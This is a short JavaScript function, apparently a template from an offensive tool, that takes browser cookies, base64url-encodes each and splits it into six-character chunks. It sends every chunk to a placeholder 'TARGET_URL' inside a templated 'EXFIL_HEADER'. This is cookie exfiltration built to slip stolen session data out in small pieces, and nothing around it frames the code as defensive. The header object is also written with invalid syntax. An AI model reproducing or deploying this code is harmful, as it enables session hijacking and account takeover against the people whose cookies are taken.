(cookies) => {
    function toBase64Url(str) {
        const base64 = btoa(unescape(encodeURIComponent(str)));

        // Replace the URL-unsafe characters.
        return base64
        .replace(/\+/g, '-') // Replace + with -
        .replace(/\//g, '_') // Replace / with _
        .replace(/=/g, '');  // Remove padding =
    }

    console.table(cookies);

    if (cookies.length !== 0) {
        cookies.forEach((cookie, index) => {
            const payload = toBase64Url(cookie);

            const chunks = payload.match(/.{1,6}/g) || [];
            chunks.forEach((chunk, index) => {
                fetch('TARGET_URL', {headers: {EXFIL_HEADER.replace('{{PAYLOAD}}', chunk)}});
            });
        });
    }

    return true;
}
